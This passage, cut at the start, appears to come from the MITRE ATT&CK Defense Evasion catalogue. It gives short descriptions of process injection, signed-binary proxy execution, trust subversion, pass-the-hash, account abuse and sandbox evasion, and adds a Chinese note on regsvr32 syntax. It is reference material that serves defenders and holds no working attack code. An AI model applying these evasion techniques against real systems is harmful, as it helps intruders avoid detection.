Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.
### .003	Thread Execution Hijacking
Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.
### .004	Asynchronous Procedure Call
Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.
### .005	Thread Local Storage
Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.
### .008	Ptrace System Calls
Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.
### .009	Proc Memory
Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.
### .011	Extra Window Memory Injection
Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.
### .012	Process Hollowing
Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.
### .013	Process Doppelgänging
Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.
### .014	VDSO Hijacking
Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.
## T1207	Rogue Domain Controller
Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.
## T1014	Rootkit
Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.
## T1218	Signed Binary Proxy Execution
Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.
### .001	Compiled HTML File
Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe).
### .002	Control Panel
Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.
### .003	CMSTP
Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.
### .004	InstallUtil
Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe.
### .005	Mshta
Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code
### .007	Msiexec
Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). Msiexec.exe is digitally signed by Microsoft.
### .008	Odbcconf
Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. Odbcconf.exe is digitally signed by Microsoft.
### .009	Regsvcs/Regasm
Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.
### .010	Regsvr32
Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary.

Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。

`regsvr32 [/u] [/s] [/n] [/i[:cmdline]] dllname`  其中dllname为activex控件文件名，建议在安装前拷贝到system文件夹下。

参数：
- /u 反注册控件
- /s 指定regsvr32 安静运行，不显示结果提示。
- /n 指定不调用 DllRegisterServer ，必须要与 /i 共同使用。
- /i:cmdline 调用DllInstall 将它传递到可选的 cmdline 。在与 /u 共同使用时，它调用 dll 卸载。
- dllname 指定要注册的dll文件名。

### .011	Rundll32
Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.
### .012	Verclsid
Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.
## T1216	Signed Script Proxy Execution
Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.
### .001	PubPrn
Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.
## T1553	Subvert Trust Controls
Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.
### .001	Gatekeeper Bypass
Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls. In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called com.apple.quarantine. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution.
### .002	Code Signing
Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. The certificates used during an operation may be created, acquired, or stolen by the adversary. Unlike Invalid Code Signature, this activity will result in a valid signature.
### .003	SIP and Trust Provider Hijacking
Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function, which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature.
### .004	Install Root Certificate
Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.
## T1221	Template Injection
Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.
## T1205	Traffic Signaling
Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.
### .001	Port Knocking
Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.
## T1127	Trusted Developer Utilities Proxy Execution
Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.
### .001	MSBuild
Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.
## T1535	Unused/Unsupported Cloud Regions
Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.
## T1550	Use Alternate Authentication Material
Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.
### .001	Application Access Token
Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.
### .002	Pass the Hash
Adversaries may "pass the hash" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.
### .003	Pass the Ticket
Adversaries may "pass the ticket" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.
### .004	Web Session Cookie
Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.
## T1078	Valid Accounts
Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.
### .001	Default Accounts
Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.
### .002	Domain Accounts
Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.
### .003	Local Accounts
Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.
### .004	Cloud Accounts
Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.
## T1497	Virtualization/Sandbox Evasion
Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.
### .001	System Checks
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.
### .002	User Activity Based Checks
Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads.
Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.
### .003	Time Based Evasion
Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.
## T1600	Weaken Encryption
Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.
### .001	Reduce Key Space
Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.
### .002	Disable Crypto Hardware
Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.
## T1220	XSL Script Processing
Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.